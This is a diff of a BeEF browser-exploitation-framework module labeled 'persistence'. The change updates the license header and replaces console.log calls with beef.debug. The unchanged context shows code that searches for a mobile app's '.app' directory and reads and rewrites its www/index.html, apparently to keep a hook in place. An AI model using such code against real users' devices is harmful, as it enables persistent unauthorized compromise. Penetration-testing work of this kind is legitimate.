@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 // persistence
 //
 beef.execute(function() {
@@ -35,12 +26,12 @@ beef.execute(function() {
     function write_file(text) {
 
         function fail () {
-            console.log('write_file fail')
+            beef.debug('write_file fail')
         }
 
         function gotFileWriter(writer) {
             writer.onwrite = function(evt) {
-                console.log("write success");
+                beef.debug("write success");
             }
             writer.write(text);
         }
@@ -68,14 +59,14 @@ beef.execute(function() {
 
     function read_index(app_name) {
         function fail () {
-            console.log('read_index fail')
+            beef.debug('read_index fail')
         }
         
         function readFile(file) {
             var reader = new FileReader();
             reader.onloadend = function(evt) {
-                //console.log("Read as text");
-                console.log(evt.target.result);
+                //beef.debug("Read as text");
+                beef.debug(evt.target.result);
                 replace_text(evt.target.result);
             };
             reader.readAsText(file);    
@@ -95,14 +86,14 @@ beef.execute(function() {
     function locate() {
  
         function result(entries) {
-         console.log('result'); 
+         beef.debug('result'); 
           var i;
           for (i=0; i<entries.length; i++) {
              // looking for <something>.app
              var re = new RegExp(/^[a-zA-Z0-9]*\.app/)
              var match = re.exec(entries[i].name)
              if (match) {
-               console.log('found ' + entries[i].name);
+               beef.debug('found ' + entries[i].name);
                
                // look for ../<something>.app/www/index.html
                read_index(entries[i].name);
@@ -116,11 +107,11 @@ beef.execute(function() {
 
      
       function fail() {
-        console.log('fail');
+        beef.debug('fail');
       }
 
       function win(entries) {
-        console.log('win');
+        beef.debug('win');
         result(entries);
       }
 
